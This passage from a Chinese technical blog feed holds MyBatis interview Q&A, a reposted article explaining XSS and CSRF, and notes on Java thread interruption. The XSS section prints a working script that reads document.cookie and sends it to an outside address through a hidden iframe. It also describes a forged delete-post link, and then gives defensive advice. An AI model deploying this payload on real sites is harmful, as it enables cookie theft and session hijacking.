class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据传入的参数进行模糊查询</span></span><br><span class="line"><span class="function">List&lt;Employee&gt; <span class="title">selectEmployeeLikeName</span><span class="params">(Employee employee)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(SqlSession session)</span> </span>&#123;</span><br><span class="line">  EmployeeMapper em = session.getMapper(EmployeeMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  Employee employee = <span class="keyword">new</span> Employee();</span><br><span class="line">  <span class="comment">// 设置模糊查询的参数</span></span><br><span class="line">  employee.setName(<span class="string">"o"</span>);</span><br><span class="line">  List&lt;Employee&gt; list = em.selectEmployeeLikeName(employee);</span><br><span class="line">  System.out.println(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通常一个xml映射文件都会写一个dao接口与之对应请问这个dao接口的工作原理是什么dao接口里的方法参数不同时方法能重载吗"><a class="markdownIt-Anchor" href="#通常一个xml映射文件都会写一个dao接口与之对应请问这个dao接口的工作原理是什么dao接口里的方法参数不同时方法能重载吗"></a> 通常一个xml映射文件，都会写一个Dao接口与之对应，请问，这个Dao接口的工作原理是什么？Dao接口里的方法，参数不同时，方法能重载吗？</h3><p>答：Dao接口，就是人们通常说的Mapper接口，接口的全限名，就是映射文件中的namespace的值，接口的方法名，就是映射文件中MappedStatement的id值，就是传递给sql的参数。Mapper接口没有实现类，当调用接口方法时，接口全限名+方法名拼接字符串作为key值，可唯一定位一个MappedStatement，举例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.mybatis3.mappers.StudentDao.findStudentById，可以唯一找到namespace为com.mybatis3.mappers.StudentDao下面id = findStudentById的MappedStatement。在Mybatis中，每一个<span class="tag">&lt;<span class="name">select</span>&gt;</span>、<span class="tag">&lt;<span class="name">insert</span>&gt;</span>、<span class="tag">&lt;<span class="name">update</span>&gt;</span>、<span class="tag">&lt;<span class="name">delete</span>&gt;</span>标签，都会被解析为一个MappedStatement对象</span><br></pre></td></tr></table></figure><p>Dao接口里的方法，是不能重载的，因为是全限名+方法名的保存和寻找策略。<br />Dao接口的工作原理是JDK动态代理，Mybatis运行时会使用JDK动态代理为Dao接口生成代理proxy对象，代理对象proxy会拦截方法接口，转而执行MappedStatement所代表的sql，然后将sql执行结果返回。</p><h3 id="mybatis是如何将sql执行结果封装成目标对象并返回的都有哪些映射形式"><a class="markdownIt-Anchor" href="#mybatis是如何将sql执行结果封装成目标对象并返回的都有哪些映射形式"></a> Mybatis是如何将sql执行结果封装成目标对象并返回的？都有哪些映射形式？</h3><p>答：第一种是使用<resultMap>标签，逐一定义列名和对象属性名之间的映射关系；第二种是使用sql列的别名功能，将列别名书写为对象属性名，比如T_NAME AS NAME，对象属性名一般是name，小写，但是列名不区分大小写，Mybatis会忽略列名大小写，智能找到与之对应对象属性名，甚至可以写成T_NAME AS NaMe，Mybatis一样可以正常工作。<br />有了列名与属性名的映射关系后，Mybatis通过反射创建对象，同时使用反射给对象的属性逐一赋值并返回，那些找不到映射关系的属性，是无法完成赋值的。</p><h3 id="mybatis是如何进行分页的分页插件的原理是什么"><a class="markdownIt-Anchor" href="#mybatis是如何进行分页的分页插件的原理是什么"></a> Mybatis是如何进行分页的？分页插件的原理是什么？</h3><p>答：Mybatis使用RowBounds对象进行分页，它是针对ResultSet结果集执行的内存分页，而非物理分页，可以在sql内直接书写带有物理分页的参数来完成物理分页功能，也可以使用分页插件来完成物理分页。<br />分页插件的基本原理是使用Mybatis提供的插件接口，实现自定义插件，在插件的拦截方法内拦截待执行的sql，然后重写sql，根据dialect方言，添加对应的物理分页语句和物理分页参数。</p><h3 id="如何执行批量插入"><a class="markdownIt-Anchor" href="#如何执行批量插入"></a> 如何执行批量插入？</h3><p>首先，创建一个简单的insert语句：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"insertname"</span>&gt;</span></span><br><span class="line">  insert into names (name) values (#&#123;value&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在Java代码中像下面这样执行批处理插入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">List&lt;string&gt; names = <span class="keyword">new</span> ArrayList&lt;&gt;(); </span><br><span class="line">names.add(“fred”); </span><br><span class="line">names.add(“barney”); </span><br><span class="line">names.add(“betty”); </span><br><span class="line">names.add(“wilma”); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意这里 executortype.batch </span></span><br><span class="line">sqlsession sqlsession = sqlsessionfactory.opensession(executortype.batch); </span><br><span class="line"><span class="keyword">try</span> &#123; </span><br><span class="line">  namemapper mapper = sqlsession.getmapper(namemapper<span class="class">.<span class="keyword">class</span>)</span>; </span><br><span class="line">  <span class="keyword">for</span> (string name : names) &#123; </span><br><span class="line">    mapper.insertname(name); </span><br><span class="line">  &#125; </span><br><span class="line">  sqlsession.commit(); </span><br><span class="line">&#125; <span class="keyword">finally</span> &#123; </span><br><span class="line">  sqlsession.close(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="如何获取自动生成的主键值"><a class="markdownIt-Anchor" href="#如何获取自动生成的主键值"></a> 如何获取自动生成的（主）键值？</h3><p>答：insert方法总是返回一个int值，这个值代表的是插入的行数。而自动生成的键值在insert方法执行完后可以被设置到传入的参数对象中。示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"insertname"</span> <span class="attr">useGeneratedkeys</span>=<span class="string">"true"</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">  insert into name (name) values (#&#123;name&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br><span class="line">name name = new name();</span><br><span class="line">name.setName("fred");</span><br><span class="line"></span><br><span class="line">int rows = mapper.insertname(name);</span><br><span class="line">System.out.println("row inserted=" + rows);</span><br><span class="line">System.out.println("generated key value=" + name.getId());</span><br></pre></td></tr></table></figure><h3 id="在mapper中如何传递多个参数"><a class="markdownIt-Anchor" href="#在mapper中如何传递多个参数"></a> 在mapper中如何传递多个参数？</h3><p>第一种：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Dao层的函数</span><br><span class="line">public selectUser(String name, String area);</span><br><span class="line"></span><br><span class="line"># 对应的xml，#&#123;0&#125;代表接收的是dao层的第一个参数，#&#123;1&#125;代表dao层中第二个参数，更多参数一致往后即可。</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectUser"</span> <span class="attr">resultMap</span>=<span class="string">"BaseResultMap"</span>&gt;</span></span><br><span class="line">  select * from user_user_t where user_name=#&#123;0&#125; and user_area=#&#123;1&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第二种：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 使用@param注解</span><br><span class="line">import org.apache.ibatis.annotations.param;</span><br><span class="line"></span><br><span class="line">public interface userMapper(user selectUser(@param("userName") String userName, @param("hashedPassword") String hashedPassword));</span><br><span class="line"></span><br><span class="line"># 然后就可以在xml像下面这样使用（推荐封装为一个map，作为单个参数传递个mapper）</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectUser"</span> <span class="attr">resultType</span>=<span class="string">"user"</span>&gt;</span></span><br><span class="line">  select id, username, hashedPassword from some_table where userName=#&#123;userName&#125; and hashedPassword=#&#123;hashedPassword&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="mybatis动态sql是做什么都有哪些动态sql能简述一下动态sql的执行原理不"><a class="markdownIt-Anchor" href="#mybatis动态sql是做什么都有哪些动态sql能简述一下动态sql的执行原理不"></a> Mybatis动态sql是做什么？都有哪些动态sql？能简述一下动态sql的执行原理不？</h3><p>答：Mybatis的动态sql可以让我们在xml映射文件内，以标签形式编写动态sql，完成逻辑判断和动态拼接sql的功能。<br />Mybatis提供了9种动态sql标签：trim|where|set|foreach|if|choose|when|otherwise|bind<br />其执行原理为，使用OGNL从sql参数对象中计算表达式的值，根据表达式的值动态拼接sql，以此来完成动态sql的功能。</p><h3 id="mybatis的xml映射文件中不同的xml映射文件id是否可以重复"><a class="markdownIt-Anchor" href="#mybatis的xml映射文件中不同的xml映射文件id是否可以重复"></a> Mybatis的xml映射文件中，不同的xml映射文件，id是否可以重复？</h3><p>答：不同的xml映射文件，如果配置了namespace，那么id可以重复；如果没有配置namespace，那么id不能重复；毕竟namespace不是必须的，只是最佳实践而已。<br />原因就是namespace+id是作为Map&lt;String, MappedStatement&gt;的key使用的，如果没有namespace，就剩下id，那么，id重复会导致数据相互覆盖。有了namespace，自然id就可以重复，namespace不同，namespace+id自然也就不同。</p><h3 id="为什么说mybatis是半自动的orm映射工具它与全自动的区别在哪里"><a class="markdownIt-Anchor" href="#为什么说mybatis是半自动的orm映射工具它与全自动的区别在哪里"></a> 为什么说Mybatis是半自动的ORM映射工具？它与全自动的区别在哪里？</h3><p>答：Hibernate属于全自动ORM映射工具，使用Hibernate查询关联对象或者关联集合对象时，可以根据对象关系模型直接获取，所以它是全自动的。<br />Mybatis在查询关联对象或关联集合对象时，需要手动编写sql来完成，所以，称之为半自动ORM映射工具。</p><h3 id="一对一-一对多的关联查询"><a class="markdownIt-Anchor" href="#一对一-一对多的关联查询"></a> 一对一、一对多的关联查询？</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"com.lcb.mapping.userMapper"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--association 一对一关联查询--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"getClass"</span> <span class="attr">parameterType</span>=<span class="string">"int"</span> <span class="attr">resultMap</span>=<span class="string">"ClassesResultMap"</span>&gt;</span></span><br><span class="line">    select * from class c, teacher t where c.teacher_id=t.id and c.c_id=#&#123;id&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">"com.lcb.user.Classes"</span> <span class="attr">id</span>=<span class="string">"ClassesResultMap"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--实体类的字段名和数据表的字段名映射--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"c_id"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"c_name"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">"teacher"</span> <span class="attr">javaType</span>=<span class="string">"com.lcb.user.Teacher"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"t_id"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"t_name"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--collection 一对多关联查询--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"getClass2"</span> <span class="attr">parameter</span>=<span class="string">"int"</span> <span class="attr">resultMap</span>=<span class="string">"ClassesResultMap2"</span>&gt;</span></span><br><span class="line">    select * from class c, teacher t, student s where c.teacher_id=t.t_id and c.c_id=s.class_id and c.c_id=#&#123;id&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">"com.lcb.user.Classes"</span> <span class="attr">id</span>=<span class="string">"ClassesResultMap2"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"c_id"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"c_name"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">"teacher"</span> <span class="attr">javaType</span>=<span class="string">"com.lcb.user.Teacher"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"t_id"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"t_name"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">association</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">"student"</span> <span class="attr">ofType</span>=<span class="string">"com.lcb.user.Student"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"s_id"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"s_name"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> Java Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Java Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS与CSRF</title>
      <link href="/xss-and-csrf/"/>
      <url>/xss-and-csrf/</url>
      
        <content type="html"><![CDATA[<p><em>以下内容全部来自于转载</em></p><h2 id="xss和csrf的介绍"><a class="markdownIt-Anchor" href="#xss和csrf的介绍"></a> XSS和CSRF的介绍</h2><p>XSS：通过客户端脚本语言（最常见是JavaScript）在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那就叫做XSS！</p><p>CSRF：又称XSRF，冒充用户发起请求（在用户不知情的情况下）完成一些违背用户意愿的请求（如恶意发帖、删帖、改密码、发邮件等）。</p><p>通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。</p><p>XSS更偏向与代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。</p><p>场景：我在一条帖子里面写下了如下代码，发了出去，然后陆陆续续有很多可爱（wu / zhi） 的用户访问到这个帖子，然后用户接下来的所有操作都由我这串代码掌控了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    alert(<span class="string">'你关不掉我'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个就是最原始的脚本注入了。用户进来就麻烦了，一直弹窗一直弹窗。<br />那么XSS（跨站脚本）就是照瓢画葫了，用JavaScript写一个请求跨站的脚本就是XSS了，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt; 包起来放在评论中</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 构造泄露信息用的 URL</span></span><br><span class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</span><br><span class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</span><br><span class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</span><br><span class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></span><br><span class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    hideFrame.height = <span class="number">0</span>;</span><br><span class="line">    hideFrame.width = <span class="number">0</span>;</span><br><span class="line">    hideFrame.style.display = <span class="string">"none"</span>;</span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line">    <span class="comment">// 开工</span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</span><br></pre></td></tr></table></figure><p>此段代码携带着cookie信息传输给了不安全的服务器，然后服务器接受到了用户的隐私消息，继而继续做其他的业务处理。</p><p>这里tips一下：上面的代码仅仅是XSS，并没有发生CSRF，因为192.168.123.123/myxss/index.php 仅仅是把用户信息存起来了而已，他并没有“伪造”用户发起一些请求，所以他只算是XSS攻击而不算是CSRF攻击，如果192.168.123.123/myxss/index.php 写的代码是 将当前用户的昵称改为“我是大笨猪”，那么就算是CSRF攻击了，因为这段代码伪造用户发出了请求（但是用户却不自知）。</p><p>那么下面我介绍一下最最简单的CSRF攻击（没有用到XSS的哦）：</p><p>一个论坛，经过我的多次抓包分析（着重分析请求返回头，请求返回体）了解到这个论坛的删帖操作是触发 <a href="http://csdnblog.com/bbs/delete_article.php?id=%E2%80%9CX" target="_blank" rel="noopener">csdnblog.com/bbs/delete_article.php?id=“X</a>&quot; 那么，我只需要在论坛中发一帖，包含一链接：<a href="http://www.csdnblog.com/bbs/delete_article.php?id=%E2%80%9CX" target="_blank" rel="noopener">www.csdnblog.com/bbs/delete_article.php?id=“X</a>&quot; ，只要有用户点击了这个链接，那么ID为X的这一篇文章就被删掉了，而且是用户完全不知情的情况（敲黑板状：此处我可没有写XSS脚本哦，我纯粹是发一个url地址出来而已，既然删除操作可以伪造，那么只要我细细分析，其他操作（发帖，改名字，发私信，只要是这个论坛具有的功能）我都可以伪造咯！</p><h2 id="xss与csrf的防范"><a class="markdownIt-Anchor" href="#xss与csrf的防范"></a> XSS与CSRF的防范</h2><p>CSRF依赖于XSS，防住XSS基本也就防住了CSRF让我们明确我们的目的，其实就是不让用户踏入XSS的坑，那我们有两个方法防止用户入坑，一个是对外部输入进行彻彻底底的敏感字符过滤，一个是在显示的时候做一些特殊处理不让敏感代码顺利执行。前者主要由前端与后端合力完成，后者的话通常就是由前端单独去完成的。</p><p>理论上只要有输入数据入口的地方，XSS漏洞就会存在，js代码可以由各种各样的模式注入到数据库中（明文或者编码），所以在中小项目中我们先明确一个意识即可，我们开发人员要有安全处理的意识，不求百分百的过滤掉非法字符，但是基本的，常见的过滤掉即可，剩下的就交给安全工程师去做吧。</p><p>中心思想：一切的一切外部来源数据，毕竟经过我们服务端代码的过滤，才能让他展示到页面上，也就是说，一切外部数据都是非法的，一定要做好过滤，尤其是WEB端。（毕竟各种js防不胜防）。</p><p><strong>通用的补充性防御手段</strong></p><ol><li><p>在输出html时，加上Content Security Policy的Http Header<br />作用：可以防止页面被XSS攻击时，嵌入第三方的脚本文件等<br />缺陷：IE或低版本的浏览器可能不支持</p></li><li><p>在设置Cookie时，加上HttpOnly参数<br />作用：可以防止页面被XSS攻击时，Cookie信息被盗取，可兼容至IE6<br />缺陷：网站本身的JS代码也无法操作Cookie，而且作用有限，只能保证Cookie的安全</p></li><li><p>在开发API时，检验请求的Referer参数<br />作用：可以在一定程度上防止CSRF攻击<br />缺陷：IE或低版本的浏览器中，Referer参数可以被伪造</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>并发编程</title>
      <link href="/java-concurrent-summary/"/>
      <url>/java-concurrent-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="可重入内置锁"><a class="markdownIt-Anchor" href="#可重入内置锁"></a> 可重入内置锁</h2><p>同一个线程在调用本类中其他synchronized方法/块或父类中的synchronized方法/块时，都不会阻碍该线程地执行，因为互斥锁时可重入的。</p><h2 id="中断线程"><a class="markdownIt-Anchor" href="#中断线程"></a> 中断线程</h2><h3 id="使用interrupt中断线程"><a class="markdownIt-Anchor" href="#使用interrupt中断线程"></a> 使用interrupt()中断线程</h3><p>当一个线程运行时，另一个线程可以调用对应的Thread对象的interrupt()方法中断它。该方法只是在目标线程中设置了一个标志位，表示它已经被中断，并立即返回。<code>如果只是单纯的调用interrupt()方法，线程并没有实际中断，会继续执行。</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SleepInterrupt</span> <span class="keyword">extends</span> <span class="title">Object</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"in run() - about to sleep for 20 seconds"</span>);</span><br><span class="line">            Thread.sleep(<span class="number">20000</span>);</span><br><span class="line">            System.out.println(<span class="string">"in run() - woke up"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">"in run() - interrupted while sleeping"</span>);</span><br><span class="line">            <span class="comment">//处理完中断异常后，返回到run（）方法人口，</span></span><br><span class="line">            <span class="comment">//如果没有return，线程不会实际被中断，它会继续打印下面的信息</span></span><br><span class="line">            <span class="keyword">return</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"in run() - leaving normally"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SleepInterrupt si = <span class="keyword">new</span> SleepInterrupt();</span><br><span class="line">        Thread t = <span class="keyword">new</span> Thread(si);</span><br><span class="line">        t.start();</span><br><span class="line">        <span class="comment">//主线程休眠2秒，从而确保刚才启动的线程有机会执行一段时间</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>); </span><br><span class="line">        &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"in main() - interrupting other thread"</span>);</span><br><span class="line">        <span class="comment">//中断线程t</span></span><br><span class="line">        t.interrupt();</span><br><span class="line">        System.out.println(<span class="string">"in main() - leaving"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20131203100807812.jpg" alt="" /></p><p>主线程启动新线程后，自身休眠2秒钟，允许新线程获得运行时间。新线程打印信息“about to sleep for 20 seconds”后，继而休眠20秒钟，大约2秒钟后，main线程通知新线程中断，那么新线程的20秒的休眠将被打断，从而抛出InterruptException异常，执行跳转到catch块，打印出“interrupted while sleeping”信息，并立即从run（）方法返回，然后消亡，而不会打印出catch块后面的“leaving normally”信息。</p><p><strong>注意：如果将catch块中的return语句注释掉，则线程在抛出异常后，会继续执行，而不会中断，从而打印出”leaving normally“信息。</strong></p><h3 id="待决中断"><a class="markdownIt-Anchor" href="#待决中断"></a> 待决中断</h3><p>上面的例子中断是在sleep()方法之后调用的，它会相当友好地终止线程，并抛出InterruptedException异常。如果在调用sleep()方法前被中断，则该中断被称为<code>待决中断</code>，它会在调用sleep()方法时，立即出InterruptedException异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PendingInterrupt</span> <span class="keyword">extends</span> <span class="title">Object</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">//如果输入了参数，则在mian线程中中断当前线程（亦即main线程）</span></span><br><span class="line">        <span class="keyword">if</span>(args.length &gt; <span class="number">0</span> )&#123;</span><br><span class="line">            Thread.currentThread().interrupt();</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//获取当前时间</span></span><br><span class="line">        <span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            System.out.println(<span class="string">"was NOT interrupted"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException x) &#123;</span><br><span class="line">            System.out.println(<span class="string">"was interrupted"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">   